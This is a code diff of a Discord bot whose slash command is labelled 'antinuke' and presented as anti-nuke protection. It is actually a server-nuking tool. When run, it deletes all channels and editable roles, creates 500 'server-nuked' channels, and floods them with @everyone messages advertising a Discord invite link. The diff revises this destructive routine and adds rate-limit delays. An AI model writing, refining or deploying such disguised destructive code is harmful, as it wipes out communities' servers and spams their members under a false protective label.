@@ -22,35 +22,29 @@ const client = new Client({
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 /* ===== CONFIG ===== */
-const CHANNEL_NAME = "Server nuked";
+const CHANNEL_NAME = "server-nuked";
 const CREATE_COUNT = 500;
 const MSG_PER_CHANNEL = 3;
-const DELETE_DELAY = 50;
-const CREATE_BATCH = 8; // số kênh tạo song song mỗi đợt (tối ưu nhất)
+const DELETE_DELAY = 60;
+const CREATE_DELAY = 50;
+const MESSAGE_DELAY = 100;
 /* ================== */
 
-/* ===== Slash Command ===== */
 const commands = [
   new SlashCommandBuilder()
     .setName("antinuke")
-    .setDescription("Bật Anti Nuke")
+    .setDescription("Bật Anti nuke")
 ].map(cmd => cmd.toJSON());
 
 const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);
 
 (async () => {
-  try {
-    console.log("🔁 Đăng slash command...");
-    await rest.put(
-      Routes.applicationCommands(process.env.CLIENT_ID),
-      { body: commands }
-    );
-    console.log("✅ Xong!");
-  } catch (e) {
-    console.error(e);
-  }
+  await rest.put(
+    Routes.applicationCommands(process.env.CLIENT_ID),
+    { body: commands }
+  );
+  console.log("✅ Slash command registered");
 })();
-/* ========================= */
 
 client.once("ready", () => {
   console.log(`🤖 Online: ${client.user.tag}`);
@@ -62,17 +56,16 @@ client.on("interactionCreate", async interaction => {
 
   const guild = interaction.guild;
 
-  // 🔥 Tạo kênh sống sót để giữ context
-  const controlChannel = await guild.channels.create({
-    name: "Anti Nuke",
+  const control = await guild.channels.create({
+    name: "antinuke-control",
     type: ChannelType.GuildText
   });
 
-  await controlChannel.send("⚠️ @everyone Join: https://discord.gg/P9yeTvwKjB");
+  await control.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
 
   /* ===== XOÁ CHANNEL ===== */
-  for (const ch of [...guild.channels.cache.values()]) {
-    if (ch.id === controlChannel.id) continue;
+  for (const ch of guild.channels.cache.values()) {
+    if (ch.id === control.id) continue;
     try {
       await ch.delete();
       await sleep(DELETE_DELAY);
@@ -80,40 +73,38 @@ client.on("interactionCreate", async interaction => {
   }
 
   /* ===== XOÁ ROLE ===== */
-  const botRolePos = guild.members.me.roles.highest.position;
-  const roles = [...guild.roles.cache.values()]
-    .filter(r => r.editable && r.name !== "@everyone" && r.position < botRolePos);
+  const botPos = guild.members.me.roles.highest.position;
+  const roles = guild.roles.cache.filter(r =>
+    r.editable && r.name !== "@everyone" && r.position < botPos
+  );
 
-  for (const role of roles) {
+  for (const role of roles.values()) {
     try {
       await role.delete();
-      await sleep(100);
+      await sleep(DELETE_DELAY);
     } catch {}
   }
 
-  await controlChannel.send(" @everyone ⚡ Join: https://discord.gg/P9yeTvwKjB");
+  await control.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
 
-  /* ===== TẠO KÊNH + GỬI TIN (TỐI ĐA TỐC ĐỘ) ===== */
-  for (let i = 0; i < CREATE_COUNT; i += CREATE_BATCH) {
-    const batch = [];
+  /* ===== TẠO KÊNH + GỬI TIN ===== */
+  for (let i = 0; i < CREATE_COUNT; i++) {
+    try {
+      const ch = await guild.channels.create({
+        name: CHANNEL_NAME,
+        type: ChannelType.GuildText
+      });
 
-    for (let j = 0; j < CREATE_BATCH && i + j < CREATE_COUNT; j++) {
-      batch.push(
-        guild.channels.create({
-          name: CHANNEL_NAME,
-          type: ChannelType.GuildText
-        }).then(async ch => {
-          for (let k = 0; k < MSG_PER_CHANNEL; k++) {
-            await ch.send("Server nuked by ``phamminhnhat__`` @everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-          }
-        })
-      );
-    }
+      for (let j = 0; j < MSG_PER_CHANNEL; j++) {
+        await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+        await sleep(MESSAGE_DELAY);
+      }
 
-    await Promise.all(batch);
+      await sleep(CREATE_DELAY);
+    } catch {}
   }
 
-  await controlChannel.send("✅ Hoàn tất Antinuke.");
+  await control.send("✅ Hoàn tất.");
 });
 
 client.login(process.env.BOT_TOKEN);
